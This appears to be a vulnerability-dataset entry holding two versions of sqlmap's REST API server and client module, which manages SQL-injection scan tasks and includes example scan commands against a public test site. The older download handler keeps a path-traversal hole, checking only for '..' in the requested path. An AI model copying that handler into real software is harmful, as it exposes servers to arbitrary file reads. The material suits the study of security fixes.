    logger.debug(""[%s] Flushed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get(""/option/<taskid>/list"")
def option_list(taskid):
    """"""
    List options for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_list()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    logger.debug(""[%s] Listed task options"" % taskid)
    return jsonize({""success"": True, ""options"": DataStore.tasks[taskid].get_options()})


@post(""/option/<taskid>/get"")
def option_get(taskid):
    """"""
    Get the value of an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_get()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    option = request.json.get(""option"", """")

    if option in DataStore.tasks[taskid].options:
        logger.debug(""[%s] Retrieved value for option %s"" % (taskid, option))
        return jsonize({""success"": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug(""[%s] Requested value for unknown option %s"" % (taskid, option))
        return jsonize({""success"": False, ""message"": ""Unknown option"", option: ""not set""})


@post(""/option/<taskid>/set"")
def option_set(taskid):
    """"""
    Set an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_set()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug(""[%s] Requested to set options"" % taskid)
    return jsonize({""success"": True})


# Handle scans
@post(""/scan/<taskid>/start"")
def scan_start(taskid):
    """"""
    Launch a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_start()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug(""[%s] Started scan"" % taskid)
    return jsonize({""success"": True, ""engineid"": DataStore.tasks[taskid].engine_get_id()})


@get(""/scan/<taskid>/stop"")
def scan_stop(taskid):
    """"""
    Stop a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_stop()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_stop()

    logger.debug(""[%s] Stopped scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/kill"")
def scan_kill(taskid):
    """"""
    Kill a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_kill()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_kill()

    logger.debug(""[%s] Killed scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/status"")
def scan_status(taskid):
    """"""
    Returns status of a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_status()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if DataStore.tasks[taskid].engine_process() is None:
        status = ""not running""
    else:
        status = ""terminated"" if DataStore.tasks[taskid].engine_has_terminated() is True else ""running""

    logger.debug(""[%s] Retrieved scan status"" % taskid)
    return jsonize({
        ""success"": True,
        ""status"": status,
        ""returncode"": DataStore.tasks[taskid].engine_get_returncode()
    })


@get(""/scan/<taskid>/data"")
def scan_data(taskid):
    """"""
    Retrieve the data of a scan
    """"""
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_data()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            ""SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_data_message.append(
            {""status"": status, ""type"": content_type, ""value"": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            ""SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug(""[%s] Retrieved scan data and error messages"" % taskid)
    return jsonize({""success"": True, ""data"": json_data_message, ""error"": json_errors_message})


# Functions to handle scans' logs
@get(""/scan/<taskid>/log/<start>/<end>"")
def scan_log_limited(taskid, start, end):
    """"""
    Retrieve a subset of log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning(""[%s] Invalid start or end value provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid start or end value, must be digits""})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            (""SELECT time, level, message FROM logs WHERE ""
             ""taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC""),
            (taskid, start, end)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages subset"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


@get(""/scan/<taskid>/log"")
def scan_log(taskid):
    """"""
    Retrieve the log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ""SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC"", (taskid,)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


# Function to handle files inside the output directory
@get(""/download/<taskid>/<target>/<filename:path>"")
def download(taskid, target, filename):
    """"""
    Download a certain file from the file system
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to download()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    path = os.path.abspath(os.path.join(paths.SQLMAP_OUTPUT_PATH, target, filename))
    # Prevent file path traversal
    if not path.startswith(paths.SQLMAP_OUTPUT_PATH):
        logger.warning(""[%s] Forbidden path (%s)"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""Forbidden path""})

    if os.path.isfile(path):
        logger.debug(""[%s] Retrieved content of file %s"" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({""success"": True, ""file"": file_content.encode(""base64"")})
    else:
        logger.warning(""[%s] File does not exist %s"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""File does not exist""})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """"""
    REST-JSON API server
    """"""
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix=""sqlmapipc-"", text=False)[1]

    logger.info(""Running REST-JSON API server at '%s:%d'.."" % (host, port))
    logger.info(""Admin ID: %s"" % DataStore.admin_id)
    logger.debug(""IPC database: %s"" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == ""gevent"":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == ""eventlet"":
            import eventlet
            eventlet.monkey_patch()
        logger.debug(""Using adapter '%s' to run bottle"" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if ""already in use"" in getSafeExString(ex):
            logger.error(""Address already in use ('%s:%s')"" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = ""Adapter '%s' is not available on this system"" % adapter
        if adapter in (""gevent"", ""eventlet""):
            errMsg += "" (e.g.: 'sudo apt-get install python-%s')"" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug(""Calling %s"" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error(""Failed to load and parse %s"" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """"""
    REST-JSON API client
    """"""

    dbgMsg = ""Example client access from command line:""
    dbgMsg += ""\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid"" % (host, port)
    dbgMsg += ""\n\t$ curl -H \""Content-Type: application/json\"" -X POST -d '{\""url\"": \""http://testphp.vulnweb.com/artists.php?artist=1\""}' http://%s:%d/scan/$taskid/start"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/data"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/log"" % (host, port)
    logger.debug(dbgMsg)

    addr = ""http://%s:%d"" % (host, port)
    logger.info(""Starting REST-JSON API client to '%s'..."" % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = ""There has been a problem while connecting to the ""
            errMsg += ""REST-JSON API server at '%s' "" % addr
            errMsg += ""(%s)"" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info(""Type 'help' or '?' for list of available commands"")

    while True:
        try:
            command = raw_input(""api%s> "" % ("" (%s)"" % taskid if taskid else """")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in (""data"", ""log"", ""status"", ""stop"", ""kill""):
            if not taskid:
                logger.error(""No task ID in use"")
                continue
            raw = _client(""%s/scan/%s/%s"" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            dataToStdout(""%s\n"" % raw)

        elif command.startswith(""new""):
            if ' ' not in command:
                logger.error(""Program arguments are missing"")
                continue

            argv = [""sqlmap.py""] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client(""%s/task/new"" % addr)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to create new task"")
                continue
            taskid = res[""taskid""]
            logger.info(""New task ID is '%s'"" % taskid)

            raw = _client(""%s/scan/%s/start"" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to start scan"")
                continue
            logger.info(""Scanning started"")

        elif command.startswith(""use""):
            taskid = (command.split()[1] if ' ' in command else """").strip(""'\"""")
            if not taskid:
                logger.error(""Task ID is missing"")
                taskid = None
                continue
            elif not re.search(r""\A[0-9a-fA-F]{16}\Z"", taskid):
                logger.error(""Invalid task ID '%s'"" % taskid)
                taskid = None
                continue
            logger.info(""Switching to task ID '%s' "" % taskid)

        elif command in (""list"", ""flush""):
            raw = _client(""%s/admin/%s/%s"" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            elif command == ""flush"":
                taskid = None
            dataToStdout(""%s\n"" % raw)

        elif command in (""exit"", ""bye"", ""quit"", 'q'):
            return

        elif command in (""help"", ""?""):
            msg =  ""help        Show this help message\n""
            msg += ""new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \""http://testphp.vulnweb.com/artists.php?artist=1\""')\n""
            msg += ""use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n""
            msg += ""data        Retrieve and show data for current task\n""
            msg += ""log         Retrieve and show log for current task\n""
            msg += ""status      Retrieve and show status for current task\n""
            msg += ""stop        Stop current task\n""
            msg += ""kill        Kill current task\n""
            msg += ""list        Display all tasks\n""
            msg += ""flush       Flush tasks (delete all tasks)\n""
            msg += ""exit        Exit this client\n""

            dataToStdout(msg)

        elif command:
            logger.error(""Unknown command '%s'"" % command)
/n/n/n",0
57,57,b4bb4c393b26072b9a47f787be134888b983af60,"/lib/utils/api.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
""""""

import logging
import os
import re
import shlex
import socket
import sqlite3
import sys
import tempfile
import time
import urllib2

from lib.core.common import dataToStdout
from lib.core.common import getSafeExString
from lib.core.common import unArrayizeValue
from lib.core.convert import base64pickle
from lib.core.convert import hexencode
from lib.core.convert import dejsonize
from lib.core.convert import jsonize
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import paths
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.defaults import _defaults
from lib.core.enums import CONTENT_STATUS
from lib.core.enums import PART_RUN_CONTENT_TYPES
from lib.core.exception import SqlmapConnectionException
from lib.core.log import LOGGER_HANDLER
from lib.core.optiondict import optDict
from lib.core.settings import RESTAPI_DEFAULT_ADAPTER
from lib.core.settings import IS_WIN
from lib.core.settings import RESTAPI_DEFAULT_ADDRESS
from lib.core.settings import RESTAPI_DEFAULT_PORT
from lib.core.subprocessng import Popen
from lib.parse.cmdline import cmdLineParser
from thirdparty.bottle.bottle import error as return_error
from thirdparty.bottle.bottle import get
from thirdparty.bottle.bottle import hook
from thirdparty.bottle.bottle import post
from thirdparty.bottle.bottle import request
from thirdparty.bottle.bottle import response
from thirdparty.bottle.bottle import run


# global settings
class DataStore(object):
    admin_id = """"
    current_db = None
    tasks = dict()


# API objects
class Database(object):
    filepath = None

    def __init__(self, database=None):
        self.database = self.filepath if database is None else database
        self.connection = None
        self.cursor = None

    def connect(self, who=""server""):
        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None)
        self.cursor = self.connection.cursor()
        logger.debug(""REST-JSON API %s connected to IPC database"" % who)

    def disconnect(self):
        if self.cursor:
            self.cursor.close()

        if self.connection:
            self.connection.close()

    def commit(self):
        self.connection.commit()

    def execute(self, statement, arguments=None):
        while True:
            try:
                if arguments:
                    self.cursor.execute(statement, arguments)
                else:
                    self.cursor.execute(statement)
            except sqlite3.OperationalError, ex:
                if not ""locked"" in getSafeExString(ex):
                    raise
            else:
                break

        if statement.lstrip().upper().startswith(""SELECT""):
            return self.cursor.fetchall()

    def init(self):
        self.execute(""CREATE TABLE logs(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, time TEXT, ""
                  ""level TEXT, message TEXT""
                  "")"")

        self.execute(""CREATE TABLE data(""
                  ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                  ""taskid INTEGER, status INTEGER, ""
                  ""content_type INTEGER, value TEXT""
                  "")"")

        self.execute(""CREATE TABLE errors(""
                    ""id INTEGER PRIMARY KEY AUTOINCREMENT, ""
                    ""taskid INTEGER, error TEXT""
                    "")"")


class Task(object):
    def __init__(self, taskid, remote_addr):
        self.remote_addr = remote_addr
        self.process = None
        self.output_directory = None
        self.options = None
        self._original_options = None
        self.initialize_options(taskid)

    def initialize_options(self, taskid):
        datatype = {""boolean"": False, ""string"": None, ""integer"": None, ""float"": None}
        self.options = AttribDict()

        for _ in optDict:
            for name, type_ in optDict[_].items():
                type_ = unArrayizeValue(type_)
                self.options[name] = _defaults.get(name, datatype[type_])

        # Let sqlmap engine knows it is getting called by the API,
        # the task ID and the file path of the IPC database
        self.options.api = True
        self.options.taskid = taskid
        self.options.database = Database.filepath

        # Enforce batch mode and disable coloring and ETA
        self.options.batch = True
        self.options.disableColoring = True
        self.options.eta = False

        self._original_options = AttribDict(self.options)

    def set_option(self, option, value):
        self.options[option] = value

    def get_option(self, option):
        return self.options[option]

    def get_options(self):
        return self.options

    def reset_options(self):
        self.options = AttribDict(self._original_options)

    def engine_start(self):
        if os.path.exists(""sqlmap.py""):
            self.process = Popen([""python"", ""sqlmap.py"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)
        else:
            self.process = Popen([""sqlmap"", ""--pickled-options"", base64pickle(self.options)], shell=False, close_fds=not IS_WIN)

    def engine_stop(self):
        if self.process:
            self.process.terminate()
            return self.process.wait()
        else:
            return None

    def engine_process(self):
        return self.process

    def engine_kill(self):
        if self.process:
            try:
                self.process.kill()
                return self.process.wait()
            except:
                pass
        return None

    def engine_get_id(self):
        if self.process:
            return self.process.pid
        else:
            return None

    def engine_get_returncode(self):
        if self.process:
            self.process.poll()
            return self.process.returncode
        else:
            return None

    def engine_has_terminated(self):
        return isinstance(self.engine_get_returncode(), int)


# Wrapper functions for sqlmap engine
class StdDbOut(object):
    def __init__(self, taskid, messagetype=""stdout""):
        # Overwrite system standard output and standard error to write
        # to an IPC database
        self.messagetype = messagetype
        self.taskid = taskid

        if self.messagetype == ""stdout"":
            sys.stdout = self
        else:
            sys.stderr = self

    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):
        if self.messagetype == ""stdout"":
            if content_type is None:
                if kb.partRun is not None:
                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)
                else:
                    # Ignore all non-relevant messages
                    return

            output = conf.database_cursor.execute(
                ""SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?"",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute(""DELETE FROM data WHERE id = ?"",
                                                     (output[index][0],))

                conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = ""%s%s"" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute(""UPDATE data SET value = ? WHERE id = ?"",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute(""INSERT INTO errors VALUES(NULL, ?, ?)"",
                                         (self.taskid, str(value) if value else """"))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """"""
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """"""
        conf.database_cursor.execute(""INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)"",
                                     (conf.taskid, time.strftime(""%X""), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, ""api""):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect(""client"")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, ""%s ('%s')"" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook(""after_request"")
def security_headers(json_header=True):
    """"""
    Set some headers across all HTTP responses
    """"""
    response.headers[""Server""] = ""Server""
    response.headers[""X-Content-Type-Options""] = ""nosniff""
    response.headers[""X-Frame-Options""] = ""DENY""
    response.headers[""X-XSS-Protection""] = ""1; mode=block""
    response.headers[""Pragma""] = ""no-cache""
    response.headers[""Cache-Control""] = ""no-cache""
    response.headers[""Expires""] = ""0""
    if json_header:
        response.content_type = ""application/json; charset=UTF-8""

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return ""Access denied""


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return ""Nothing here""


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return ""Method not allowed""


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return ""Internal server error""

#############################
# Task management functions #
#############################


# Users' methods
@get(""/task/new"")
def task_new():
    """"""
    Create new task ID
    """"""
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug(""Created new task: '%s'"" % taskid)
    return jsonize({""success"": True, ""taskid"": taskid})


@get(""/task/<taskid>/delete"")
def task_delete(taskid):
    """"""
    Delete own task ID
    """"""
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug(""[%s] Deleted task"" % taskid)
        return jsonize({""success"": True})
    else:
        logger.warning(""[%s] Invalid task ID provided to task_delete()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

###################
# Admin functions #
###################


@get(""/admin/<taskid>/list"")
def task_list(taskid=None):
    """"""
    List task pull
    """"""
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))[""status""]

    logger.debug(""[%s] Listed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True, ""tasks"": tasks, ""tasks_num"": len(tasks)})

@get(""/admin/<taskid>/flush"")
def task_flush(taskid):
    """"""
    Flush task spool (delete all tasks)
    """"""

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug(""[%s] Flushed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get(""/option/<taskid>/list"")
def option_list(taskid):
    """"""
    List options for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_list()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    logger.debug(""[%s] Listed task options"" % taskid)
    return jsonize({""success"": True, ""options"": DataStore.tasks[taskid].get_options()})


@post(""/option/<taskid>/get"")
def option_get(taskid):
    """"""
    Get the value of an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_get()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    option = request.json.get(""option"", """")

    if option in DataStore.tasks[taskid].options:
        logger.debug(""[%s] Retrieved value for option %s"" % (taskid, option))
        return jsonize({""success"": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug(""[%s] Requested value for unknown option %s"" % (taskid, option))
        return jsonize({""success"": False, ""message"": ""Unknown option"", option: ""not set""})


@post(""/option/<taskid>/set"")
def option_set(taskid):
    """"""
    Set an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_set()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug(""[%s] Requested to set options"" % taskid)
    return jsonize({""success"": True})


# Handle scans
@post(""/scan/<taskid>/start"")
def scan_start(taskid):
    """"""
    Launch a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_start()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug(""[%s] Started scan"" % taskid)
    return jsonize({""success"": True, ""engineid"": DataStore.tasks[taskid].engine_get_id()})


@get(""/scan/<taskid>/stop"")
def scan_stop(taskid):
    """"""
    Stop a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_stop()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_stop()

    logger.debug(""[%s] Stopped scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/kill"")
def scan_kill(taskid):
    """"""
    Kill a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_kill()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_kill()

    logger.debug(""[%s] Killed scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/status"")
def scan_status(taskid):
    """"""
    Returns status of a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_status()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if DataStore.tasks[taskid].engine_process() is None:
        status = ""not running""
    else:
        status = ""terminated"" if DataStore.tasks[taskid].engine_has_terminated() is True else ""running""

    logger.debug(""[%s] Retrieved scan status"" % taskid)
    return jsonize({
        ""success"": True,
        ""status"": status,
        ""returncode"": DataStore.tasks[taskid].engine_get_returncode()
    })


@get(""/scan/<taskid>/data"")
def scan_data(taskid):
    """"""
    Retrieve the data of a scan
    """"""
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_data()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            ""SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_data_message.append(
            {""status"": status, ""type"": content_type, ""value"": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            ""SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug(""[%s] Retrieved scan data and error messages"" % taskid)
    return jsonize({""success"": True, ""data"": json_data_message, ""error"": json_errors_message})


# Functions to handle scans' logs
@get(""/scan/<taskid>/log/<start>/<end>"")
def scan_log_limited(taskid, start, end):
    """"""
    Retrieve a subset of log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning(""[%s] Invalid start or end value provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid start or end value, must be digits""})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            (""SELECT time, level, message FROM logs WHERE ""
             ""taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC""),
            (taskid, start, end)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages subset"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


@get(""/scan/<taskid>/log"")
def scan_log(taskid):
    """"""
    Retrieve the log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ""SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC"", (taskid,)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


# Function to handle files inside the output directory
@get(""/download/<taskid>/<target>/<filename:path>"")
def download(taskid, target, filename):
    """"""
    Download a certain file from the file system
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to download()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Prevent file path traversal - the lame way
    if "".."" in target:
        logger.warning(""[%s] Forbidden path (%s)"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""Forbidden path""})

    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)

    if os.path.exists(path):
        logger.debug(""[%s] Retrieved content of file %s"" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({""success"": True, ""file"": file_content.encode(""base64"")})
    else:
        logger.warning(""[%s] File does not exist %s"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""File does not exist""})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """"""
    REST-JSON API server
    """"""
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix=""sqlmapipc-"", text=False)[1]

    logger.info(""Running REST-JSON API server at '%s:%d'.."" % (host, port))
    logger.info(""Admin ID: %s"" % DataStore.admin_id)
    logger.debug(""IPC database: %s"" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
